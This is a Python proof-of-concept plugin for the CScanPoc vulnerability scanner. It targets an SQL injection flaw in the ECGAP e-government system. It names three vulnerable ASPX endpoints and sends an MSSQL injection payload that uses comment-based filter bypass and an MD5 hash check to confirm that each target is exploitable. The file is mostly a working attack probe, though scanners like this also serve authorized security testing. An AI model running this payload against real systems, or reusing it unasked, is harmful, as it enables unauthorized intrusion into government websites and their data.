# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Inspur_0000'  # 平台漏洞编号，留空
    name = 'ECGAP电子政务系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-25'  # 漏洞公布时间
    desc = '''
        ECGAP电子政务系统四处注入完美绕过：
        "/Bulletin/DocmentDownload.aspx?ID=",
        "/LeaderMail/MailDetail.aspx?QueryId=",
        "/ViewSource/SrcPrintList.aspx?SerailNO=",
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0128477
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ECGAP电子政务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '07fe81e1-56dc-46e3-b991-d839fe1d3dc6'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/Bulletin/DocmentDownload.aspx?ID=",
                "/LeaderMail/MailDetail.aspx?QueryId=",
                "/ViewSource/SrcPrintList.aspx?SerailNO=",
            ]

            data = "%27and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code != 0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
